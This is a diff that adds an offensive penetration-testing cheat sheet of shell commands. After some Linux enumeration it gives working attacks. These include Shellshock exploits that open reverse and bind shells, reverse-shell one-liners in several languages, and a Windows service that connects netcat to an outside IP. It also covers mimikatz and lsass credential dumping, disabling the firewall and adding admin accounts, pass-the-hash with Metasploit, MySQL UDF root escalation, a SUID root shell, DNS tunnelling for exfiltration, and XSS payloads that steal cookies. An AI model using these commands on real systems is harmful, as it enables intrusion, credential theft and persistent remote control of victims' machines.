@@ -1,0 +1,530 @@
+# find programs with a set uid bit
+find / -uid 0 -perm -4000 2>/dev/null
+
+# find things that are world writable
+find / -perm -o=w
+
+# find names with dots and spaces, there shouldn’t be any
+find / -name " " -print
+find / -name ".." -print
+find / -name ". " -print
+find / -name " " -print
+
+# which users have shells on the box?
+grep -vE "nologin|false" /etc/passwd
+
+# find filenames containing 'config'
+find . -iname '*config*'
+
+# find files that are not owned by anyone
+find / -nouser
+
+# look for files that are unlinked
+lsof +L1
+
+# get information about procceses with open ports
+lsof -i
+
+# look for weird things in arp
+arp -a
+
+# look at all accounts including AD
+getent passwd
+
+# look at all groups and membership including AD
+getent group
+
+# list crontabs for all users including AD
+for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done
+
+# generate random passwords
+cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4
+
+# find all immutable files, there should not be any
+find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
+
+# fix immutable files
+chattr -i file
+
+# Find SUID root files
+find / -user root -perm -4000 -print 2>/dev/null
+
+# Find SGID root files:
+find / -group root -perm -2000 -print 2>/dev/null
+
+# Find SUID and SGID files owned by anyone:
+find / -perm -4000 -o -perm -2000 -print 2>/dev/null
+
+# Find files that are not owned by any user:
+find / -nouser -print
+
+# Find files that are not owned by any group:
+find / -nogroup -print
+
+# Find symlinks and what they point to:
+find / -type l -ls
+
+# find world-writeable folders
+find / -writeable -type d 2</dev/null
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+
+# find world executable folders
+find / -perm -o x -type d 2>/dev/null
+
+# world writable and executable 
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null 
+
+# list all super user accounts
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
+
+# find .conf files(recursive 4 levels) and output line number where the word 'password' is located
+find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} \; 2>/dev/null
+
+# list .conf files /etc (recursive 1 level)
+find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null
+
+# check log files for keywords('pass' in this example) and show matches
+grep -l -i pass /var/log/*.log 2>/dev/null
+
+#list .log files in specified directory(/var/log)
+find /var/log -name *.log -type f -exec ls -la {} \; 2>/dev/null
+
+# List files in specified directory (/var/log)
+find /var/log -type f -exec ls -la {} \; 2>/dev/null
+
+# find ssh keys/host information
+find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r ls -la
+
+
+# trusty python shell upgrade 
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+# python\ruby\php HTTP servers
+
+python2 -m SimpleHTTPServer
+python3 -m http.server
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
+php -S 0.0.0.0:8888
+
+
+# shell-shock bash reverse shell 
+
+curl -H "User-agent: () { :; }; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http://<target>/cgi-bin/admin.cgi -v
+
+# moar shellshock 
+
+	# A tool to find and exploit servers vulnerable to Shellshock
+	# https://github.com/nccgroup/shocker
+	$ ./shocker.py -H 192.168.56.118  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+
+	# cat file
+	$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 172.16.236.141 80
+
+	# bind shell
+	$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
+
+	# reverse Shell
+	$ nc -l -p 443
+	$ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
+
+
+# wget shellshock one liner through a proxy (from the droopy vm is this syntax)
+
+wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status
+
+# same as above except using the python reverse method
+
+wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.57.102\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>&1" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status
+
+
+# check whats in the the title tag of website
+
+curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+
+
+# Dirb dir bruteforce
+dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
+
+
+# scan something with netcat
+nc -v -w 1 target -z 1-1000
+for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
+
+
+# A best nmap scan strategy for networks of all sizes. 
+
+	# Host Discovery - Generate Live Hosts List
+	$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
+	$ grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt
+
+	# Port Discovery - Most Common Ports
+	# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
+	$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
+	$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
+	$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt
+
+	# Port Discovery - Full Port Scans (UDP is very slow)
+	$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
+	$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
+
+	# Print TCP\UDP Ports
+	$ grep "open" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "T:"$0}'
+	$ grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "U:"$0}'
+
+	# Detect Service Version
+	$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
+
+	# Operating System Scan
+	$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
+
+	# OS and Service Detect
+	$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
+
+
+
+
+
+# usefull windows commands:
+net localgroup Users
+net localgroup Administrators
+search dir/s *.doc
+system("start cmd.exe /k $cmd")
+sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
+/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
+mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
+C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
+
+
+# enable RDP access
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+
+
+
+# turn off windows firewall
+netsh firewall set opmode disable
+
+
+# add a new user in windows
+net user test 1234 /add
+net localgroup administrators test /add
+
+
+
+# snmp enum 
+snmpget -v 1 -c public IP
+snmpwalk -v 1 -c public IP
+snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
+
+
+# samba enum
+nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U "" target
+enum4linux target
+
+
+# smb user enumeration
+python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
+
+# RID cycle SMB / enumerate users from SMB
+ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
+
+# mount NFS share to /mnt/nfs
+mount 192.168.1.1:/vol/share /mnt/nfs
+
+# mount a windows share
+smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+
+# smb user enum
+python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
+
+
+# connect to a samba share 
+$ smbmount //server/share /mnt/win -o user=username,password=password1
+$ smbclient -U user \\\\server\\share
+$ mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share
+
+
+
+# pass the hash 
+git clone https://github.com/byt3bl33d3r/pth-toolkit
+pth-winexe -U hash //IP cmd
+
+or
+
+apt-get install freerdp-x11
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+
+or
+
+meterpreter > run post/windows/gather/hashdump
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+msf exploit(psexec) > exploit
+meterpreter > shell
+
+
+
+
+
+# python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+# php reverse shell
+php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+
+# perl reverse shell
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+# bash reverse shell
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+
+# ruby reverse shell
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+
+
+
+# MySQL run with root privs local priv escalation
+# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
+$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
+$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select * from mysql.func;
+mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');
+
+user:~$ su -
+Password:
+user:~# whoami
+root
+root:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+# Cewl a website then mangle 
+$ cewl -m 4 -w dict.txt http://site.url
+$ john --wordlist=dict.txt --rules --stdout
+
+
+
+# SSH pivots
+ssh -D 127.0.0.1:1080 -p 22 user@IP
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
+proxychains commands target
+
+
+# SSH pivots from one network to another
+ssh -D 127.0.0.1:1080 -p 22 user1@IP1
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
+proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
+Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
+proxychains commands target
+
+
+# more SSH tunnels
+Local Port Forwarding
+ssh -L 3306:localhost:3306 username@hostname
+telnet localhost 3306
+
+Remote Port Forwarding
+ssh -R 9000:localhost:8001 username@hostname
+ssh -R 2222:localhost:22 username@hostname - SSH
+ssh -R 2223:localhost:5902 username@hostname - VNC
+autossh -M 20000 -f -R 2222:localhost:80 username@hostname
+telnet someserver 9000 -> go to localhost:8001
+
+
+# meterpreter portfwd
+# https://www.offensive-security.com/metasploit-unleashed/portfwd/
+# forward remote port to local address
+meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
+kali > rdesktop 127.0.0.1:3389
+
+
+
+# SUID C Shell for /bin/bash or /bin/whatever you want
+int main(void){
+       setresuid(0, 0, 0);
+       system("/bin/bash");
+}       
+
+
+
+# SQLMap examples, check highoncoffee blog for more
+
+# automated scan
+
+sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
+
+# targeted scan
+
+sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"
+
+
+
+
+
+# Tunnel over dns to bypass firewalls
+# Tunneling Data and Commands Over DNS to Bypass Firewalls
+# dnscat2 supports "download" and "upload" commands for getting files (data and programs) to and from # the victim’s host.
+
+# server (attacker)
+$ apt-get update
+$ apt-get -y install ruby-dev git make g++
+$ gem install bundler
+$ git clone https://github.com/iagox86/dnscat2.git
+$ cd dnscat2/server
+$ bundle install
+$ ruby ./dnscat2.rb
+dnscat2> New session established: 16059
+dnscat2> session -i 16059
+
+# client (victum)
+# https://downloads.skullsecurity.org/dnscat2/
+# https://github.com/lukebaggett/dnscat2-powershell
+$ dnscat --host <dnscat server_ip>
+
+
+
+
+
+
+
+# GETSYSTEM with standard user shell on win7
+
+https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051
+https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
+https://www.exploit-db.com/exploits/37049/
+
+# check the list of patches applied on the target machine
+# to get the list of Hotfixes installed, type in the following command.
+wmic qfe get
+wmic qfe | find "3057191"
+
+# Upload compile exploit to victim machine and run it
+https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe
+
+# by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe
+# https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file "main.c"
+
+# dump clear text password of the currently logged in user using wce.exe
+http://www.ampliasecurity.com/research/windows-credentials-editor/
+wce -w
+
+# dump hashes of other users with pwdump7
+http://www.heise.de/download/pwdump.html
+
+
+
+
+
+
+#usefull msf modules of all kinds (just keep these in mind)
+#bypass UAC on win7x86/64
+use exploit/windows/local/bypassuac
+
+#powershell delivery
+use exploit/multi/script/web_delivery
+
+# upload and run a powershell script through a session
+post/windows/manage/powershell/exec_powershell
+
+#JBOSS vuln scanner
+use auxiliary/scanner/http/jboss_vulnscan
+
+#JBOSS deploy
+use exploit/multi/http/jboss_maindeployer
+
+# MSSQL payload
+use exploit/windows/mssql/mssql_payload
+
+# show privs of current user
+run post/windows/gather/win_privs
+
+# Grab GPP saved passwords
+use post/windows/gather/credentials/gpp
+
+# load mimikatz
+load mimikatz -> wdigest
+
+# check for other machines that supplied domain user can access
+run post/windows/gather/local_admin_search_enum
+
+
+
+
+
+
+
+
+# XSS stuff
+
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+("< iframes > src=http://IP:PORT </ iframes >")
+
+<script>document.location=http://IP:PORT</script>
+
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+";!–"<XSS>=&amp;amp;{()}
+
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
+<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
+
+<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
+<IMG SRC="jav ascript:alert('XSS');">
+
+perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out
+
+<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+(">< iframes http://google.com < iframes >)
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
+"><script >alert(document.cookie)</script>
+%253cscript%253ealert(document.cookie)%253c/script%253e
+"><s"%2b"cript>alert(document.cookie)</script>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
+<img src=asdf onerror=alert(document.cookie)>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
